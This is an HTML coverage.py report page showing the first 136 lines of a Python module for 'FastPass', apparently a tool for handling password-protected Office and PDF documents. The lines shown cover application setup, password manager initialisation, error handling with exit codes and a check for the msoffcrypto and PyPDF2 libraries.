                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">156 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">126<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">30<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_145eef247bfb46b6___main___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_145eef247bfb46b6_cli_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Main Application</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">Maps to: A5a-A5g FastPass Application Initialization and main processing flow</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="key">import</span> <span class="nam">sys</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="key">import</span> <span class="nam">atexit</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="key">from</span> <span class="nam">datetime</span> <span class="key">import</span> <span class="nam">datetime</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t"><span class="key">from</span> <span class="nam">typing</span> <span class="key">import</span> <span class="nam">Dict</span><span class="op">,</span> <span class="nam">Any</span><span class="op">,</span> <span class="nam">List</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t"><span class="key">import</span> <span class="nam">logging</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t"><span class="key">from</span> <span class="nam">utils</span><span class="op">.</span><span class="nam">config</span> <span class="key">import</span> <span class="nam">FastPassConfig</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t"><span class="key">from</span> <span class="nam">utils</span><span class="op">.</span><span class="nam">logger</span> <span class="key">import</span> <span class="nam">sanitize_error_message</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t"><span class="key">class</span> <span class="nam">FastPassApplication</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t"><span class="str">    A5a: Create FastPassApplication Class</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t"><span class="str">    Main application class that orchestrates the entire FastPass workflow</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t">    <span class="key">def</span> <span class="nam">__init__</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">args</span><span class="op">,</span> <span class="nam">logger</span><span class="op">:</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Logger</span><span class="op">,</span> <span class="nam">config</span><span class="op">:</span> <span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">Any</span><span class="op">]</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t"><span class="str">        A5b: Initialize Instance Variables</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t27" href="#t27">27</a></span><span class="t"><span class="str">        Store command-line arguments, logger, and configuration</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t28" href="#t28">28</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t29" href="#t29">29</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">args</span> <span class="op">=</span> <span class="nam">args</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t30" href="#t30">30</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span> <span class="op">=</span> <span class="nam">logger</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t31" href="#t31">31</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">config</span> <span class="op">=</span> <span class="nam">config</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t32" href="#t32">32</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t33" href="#t33">33</a></span><span class="t">        <span class="com"># A5c: Initialize Tracking Lists</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t34" href="#t34">34</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">temp_files_created</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t35" href="#t35">35</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">processing_results</span> <span class="op">=</span> <span class="op">{</span><span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t36" href="#t36">36</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t37" href="#t37">37</a></span><span class="t">        <span class="com"># A5d: Record Operation Start Time</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t38" href="#t38">38</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">operation_start_time</span> <span class="op">=</span> <span class="nam">datetime</span><span class="op">.</span><span class="nam">now</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t39" href="#t39">39</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t40" href="#t40">40</a></span><span class="t">        <span class="com"># A5e: Initialize Password Manager</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t41" href="#t41">41</a></span><span class="t">        <span class="key">from</span> <span class="nam">core</span><span class="op">.</span><span class="nam">password</span><span class="op">.</span><span class="nam">password_manager</span> <span class="key">import</span> <span class="nam">PasswordManager</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t42" href="#t42">42</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">password_manager</span> <span class="op">=</span> <span class="nam">PasswordManager</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t43" href="#t43">43</a></span><span class="t">            <span class="nam">cli_passwords</span><span class="op">=</span><span class="nam">getattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'password'</span><span class="op">,</span> <span class="op">[</span><span class="op">]</span><span class="op">)</span> <span class="key">or</span> <span class="op">[</span><span class="op">]</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t44" href="#t44">44</a></span><span class="t">            <span class="nam">password_list_file</span><span class="op">=</span><span class="nam">getattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'password_list'</span><span class="op">,</span> <span class="key">None</span><span class="op">)</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t45" href="#t45">45</a></span><span class="t">            <span class="nam">stdin_mapping</span><span class="op">=</span><span class="nam">getattr</span><span class="op">(</span><span class="nam">args</span><span class="op">,</span> <span class="str">'stdin_password_mapping'</span><span class="op">,</span> <span class="key">None</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t46" href="#t46">46</a></span><span class="t">        <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t47" href="#t47">47</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t48" href="#t48">48</a></span><span class="t">        <span class="com"># A5f: Set Application State Flags</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t49" href="#t49">49</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">ready_for_processing</span> <span class="op">=</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t50" href="#t50">50</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">cleanup_required</span> <span class="op">=</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t51" href="#t51">51</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t52" href="#t52">52</a></span><span class="t">        <span class="com"># A5g: Log Application Initialized</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t53" href="#t53">53</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="str">'FastPass application initialized'</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t54" href="#t54">54</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t55" href="#t55">55</a></span><span class="t">        <span class="com"># Register cleanup handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t56" href="#t56">56</a></span><span class="t">        <span class="nam">atexit</span><span class="op">.</span><span class="nam">register</span><span class="op">(</span><span class="nam">self</span><span class="op">.</span><span class="nam">_emergency_cleanup</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t57" href="#t57">57</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t58" href="#t58">58</a></span><span class="t">    <span class="key">def</span> <span class="nam">run</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="nam">int</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t59" href="#t59">59</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t60" href="#t60">60</a></span><span class="t"><span class="str">        Main execution flow following the complete flowchart</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t61" href="#t61">61</a></span><span class="t"><span class="str">        Returns exit code (0=success, 1=error, 2=invalid args, 3=security, 4=password)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t62" href="#t62">62</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t63" href="#t63">63</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t64" href="#t64">64</a></span><span class="t">            <span class="com"># A4a-A4e: Crypto Tool Detection</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t65" href="#t65">65</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">_check_crypto_tools</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t66" href="#t66">66</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t67" href="#t67">67</a></span><span class="t">            <span class="com"># Section B: Security &amp; File Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t68" href="#t68">68</a></span><span class="t">            <span class="nam">validated_files</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_perform_security_and_file_validation</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t69" href="#t69">69</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t70" href="#t70">70</a></span><span class="t">            <span class="com"># Section C: Crypto Tool Setup &amp; Configuration</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t71" href="#t71">71</a></span><span class="t">            <span class="nam">crypto_handlers</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_setup_crypto_tools_and_configuration</span><span class="op">(</span><span class="nam">validated_files</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t72" href="#t72">72</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t73" href="#t73">73</a></span><span class="t">            <span class="com"># Section D: File Processing &amp; Operations</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t74" href="#t74">74</a></span><span class="t">            <span class="nam">processing_results</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_process_files_with_crypto_operations</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t75" href="#t75">75</a></span><span class="t">                <span class="nam">validated_files</span><span class="op">,</span> <span class="nam">crypto_handlers</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t76" href="#t76">76</a></span><span class="t">            <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t77" href="#t77">77</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t78" href="#t78">78</a></span><span class="t">            <span class="com"># Section E: Cleanup &amp; Results Reporting</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t79" href="#t79">79</a></span><span class="t">            <span class="nam">exit_code</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_cleanup_and_generate_final_report</span><span class="op">(</span><span class="nam">processing_results</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t80" href="#t80">80</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t81" href="#t81">81</a></span><span class="t">            <span class="key">return</span> <span class="nam">exit_code</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t82" href="#t82">82</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t83" href="#t83">83</a></span><span class="t">        <span class="key">except</span> <span class="nam">SecurityViolationError</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t84" href="#t84">84</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">error</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Security violation: </span><span class="op">{</span><span class="nam">sanitize_error_message</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">e</span><span class="op">)</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t85" href="#t85">85</a></span><span class="t">            <span class="key">return</span> <span class="num">3</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t86" href="#t86">86</a></span><span class="t">        <span class="key">except</span> <span class="nam">FileFormatError</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t87" href="#t87">87</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">error</span><span class="op">(</span><span class="fst">f"</span><span class="fst">File format error: </span><span class="op">{</span><span class="nam">sanitize_error_message</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">e</span><span class="op">)</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t88" href="#t88">88</a></span><span class="t">            <span class="key">return</span> <span class="num">1</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t89" href="#t89">89</a></span><span class="t">        <span class="key">except</span> <span class="nam">CryptoToolError</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t90" href="#t90">90</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">error</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Crypto tool error: </span><span class="op">{</span><span class="nam">sanitize_error_message</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">e</span><span class="op">)</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t91" href="#t91">91</a></span><span class="t">            <span class="key">return</span> <span class="num">1</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t92" href="#t92">92</a></span><span class="t">        <span class="key">except</span> <span class="nam">PasswordError</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t93" href="#t93">93</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">error</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Password error: </span><span class="op">{</span><span class="nam">sanitize_error_message</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">e</span><span class="op">)</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t94" href="#t94">94</a></span><span class="t">            <span class="key">return</span> <span class="num">4</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t95" href="#t95">95</a></span><span class="t">        <span class="key">except</span> <span class="nam">ProcessingError</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t96" href="#t96">96</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">error</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Processing error: </span><span class="op">{</span><span class="nam">sanitize_error_message</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">e</span><span class="op">)</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t97" href="#t97">97</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">_cleanup_partial_processing_on_failure</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t98" href="#t98">98</a></span><span class="t">            <span class="key">return</span> <span class="num">1</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t99" href="#t99">99</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t100" href="#t100">100</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">error</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Unexpected error: </span><span class="op">{</span><span class="nam">sanitize_error_message</span><span class="op">(</span><span class="nam">str</span><span class="op">(</span><span class="nam">e</span><span class="op">)</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t101" href="#t101">101</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">_emergency_cleanup</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t102" href="#t102">102</a></span><span class="t">            <span class="key">return</span> <span class="num">2</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t103" href="#t103">103</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t104" href="#t104">104</a></span><span class="t">    <span class="key">def</span> <span class="nam">_check_crypto_tools</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t105" href="#t105">105</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t106" href="#t106">106</a></span><span class="t"><span class="str">        A4a-A4e: Crypto Tool Detection</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t107" href="#t107">107</a></span><span class="t"><span class="str">        Check if all required crypto tools are available</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t108" href="#t108">108</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t109" href="#t109">109</a></span><span class="t">        <span class="com"># A4a: Load Encryption Tool Support</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t110" href="#t110">110</a></span><span class="t">        <span class="nam">crypto_tools</span> <span class="op">=</span> <span class="op">{</span><span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t111" href="#t111">111</a></span><span class="t">        <span class="nam">missing_tools</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t112" href="#t112">112</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t113" href="#t113">113</a></span><span class="t">        <span class="com"># A4b: Check Office Document Tool</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t114" href="#t114">114</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t115" href="#t115">115</a></span><span class="t">            <span class="key">import</span> <span class="nam">msoffcrypto</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t116" href="#t116">116</a></span><span class="t">            <span class="nam">crypto_tools</span><span class="op">[</span><span class="str">'msoffcrypto'</span><span class="op">]</span> <span class="op">=</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t117" href="#t117">117</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="str">"Office document tool available"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t118" href="#t118">118</a></span><span class="t">        <span class="key">except</span> <span class="nam">ImportError</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t119" href="#t119">119</a></span><span class="t">            <span class="nam">missing_tools</span><span class="op">.</span><span class="nam">append</span><span class="op">(</span><span class="str">'msoffcrypto-tool'</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t120" href="#t120">120</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span><span class="str">"msoffcrypto-tool not available"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t121" href="#t121">121</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t122" href="#t122">122</a></span><span class="t">        <span class="com"># A4c: Check PDF Processing Tool</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t123" href="#t123">123</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t124" href="#t124">124</a></span><span class="t">            <span class="key">import</span> <span class="nam">PyPDF2</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t125" href="#t125">125</a></span><span class="t">            <span class="nam">crypto_tools</span><span class="op">[</span><span class="str">'PyPDF2'</span><span class="op">]</span> <span class="op">=</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t126" href="#t126">126</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="str">"PDF processing tool available"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t127" href="#t127">127</a></span><span class="t">        <span class="key">except</span> <span class="nam">ImportError</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t128" href="#t128">128</a></span><span class="t">            <span class="nam">missing_tools</span><span class="op">.</span><span class="nam">append</span><span class="op">(</span><span class="str">'PyPDF2'</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t129" href="#t129">129</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span><span class="str">"PyPDF2 not available"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t130" href="#t130">130</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t131" href="#t131">131</a></span><span class="t">        <span class="com"># A4e: Validate All Tools Present</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t132" href="#t132">132</a></span><span class="t">        <span class="key">if</span> <span class="nam">missing_tools</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t133" href="#t133">133</a></span><span class="t">            <span class="key">raise</span> <span class="nam">CryptoToolError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Missing required tools: </span><span class="op">{</span><span class="nam">missing_tools</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t134" href="#t134">134</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t135" href="#t135">135</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">crypto_tools</span> <span class="op">=</span> <span class="nam">crypto_tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t136" href="#t136">136</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
